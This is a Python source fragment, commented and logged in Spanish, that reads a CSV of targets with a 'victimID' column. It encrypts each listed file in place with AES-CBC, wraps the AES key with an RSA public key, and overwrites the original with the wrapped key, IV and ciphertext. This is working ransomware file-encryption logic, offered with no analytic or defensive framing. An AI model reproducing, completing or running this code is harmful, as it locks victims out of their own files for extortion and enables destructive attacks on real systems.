import os
import csv
import logging
from time import sleep
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding

KEY_SIZE = 32
BLOCK_SIZE = 16

def encrypt_files_from_csv(csv_file, public_key):
    symmetric_key = generate_symmetric_key()
    with open(csv_file, 'r', encoding='utf-8') as csvfile:
        csv_reader = csv.reader(csvfile)
        next(csv_reader)  # Skip header row
        for row in csv_reader:
            victimID, level, file_path, file_type, extension = row
            if file_type.lower() == 'file':
                print(f'Encrypting {file_path}')
                encrypt_file(file_path, public_key, symmetric_key)
              
def encrypt_file(file_path, public_key, symmetric_key):
    logging.info('Inicia la función encrypt_file.')
    sleep(1)
    with open(file_path, 'rb') as f:
        file_data = f.read()

    # Ciframos el archivo con AES
    padder = sym_padding.PKCS7(BLOCK_SIZE * 8).padder()
    padded_data = padder.update(file_data) + padder.finalize()
    
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(symmetric_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ct = encryptor.update(padded_data) + encryptor.finalize()
    logging.info('El archivo ha sido cifrado con AES.')
    sleep(1)
    # Ciframos la clave simétrica con RSA
    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    logging.info('La clave simétrica ha sido cifrada con RSA.')
    sleep(1)
    # Guardamos el archivo cifrado, la clave simétrica cifrada y el iv en un archivo
    with open(file_path, 'wb') as f:
        f.write(encrypted_symmetric_key + iv + ct)

    logging.info('Archivo cifrado guardado.')
